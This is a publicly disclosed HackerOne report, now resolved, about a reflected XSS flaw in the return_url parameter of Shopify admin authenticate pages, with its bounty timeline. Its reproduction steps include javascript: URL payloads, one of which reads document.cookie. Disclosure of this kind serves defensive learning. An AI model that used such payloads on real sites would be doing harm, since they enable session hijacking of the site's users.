---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2018-11-13
submitted: 2018-10-11T19:25:34.947Z
bounty_usd: 1500
votes: 58
cve: []
program: "[[programs/shopify|Shopify]]"
reporter: "dr_dragon"
source: "https://hackerone.com/reports/422707"
title: "Reflected XSS on $Any$.myshopify.com/admin"
---
# Reflected XSS on $Any$.myshopify.com/admin

> **Severity:** High | **Bounty:** 1,500 USD | **Votes:** 58 | **Program:** Shopify | **Disclosed:** 2018-11-13

- Report: [https://hackerone.com/reports/422707](https://hackerone.com/reports/422707)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2018-10-11T19:25:34.947Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Description :
Hi,
I have found a reflected cross site scripting vulnerability in <any>.myshopify.com/admin through return_url parameter .

# Step to reproduce :
1-Go to https://<Any>.myshopify.com/admin/authenticate?return_url=javascript:alert(100)//
2-Click on reload this page
3-Xss alert message

## Impact

Xss attack in <Any>.myshopify.com/admin

## Timeline

- **Report Filed**
- **2018-10-11** @dr_dragon: # Another Vulnerable url :
Go to https://<Any>.myshopify.com/admin/authenticate/?return_url=https://<Any>.myshopify.com/admin/authenticate/?return_url=javascript:alert(document.cookie)
and click on reload this page :) .
- **Report Triaged**
- **2018-10-14** @dr_dragon: It’s fixed now 
Nice work
- **Report Resolved**
- **Bounty Awarded**
- **2018-10-21** @dr_dragon: How can i get $500 bons for this report :) :) :)
- **2018-10-22** @clayton: @dr_dragon $1,500 is the final, total bounty amount for this report.
- **2018-10-22** @dr_dragon: ok thanks for the bounty .
- **Agreed On Going Public**
- **2018-11-07** @dr_dragon: not yet .
- **Agreed On Going Public**
- **Report Became Public**
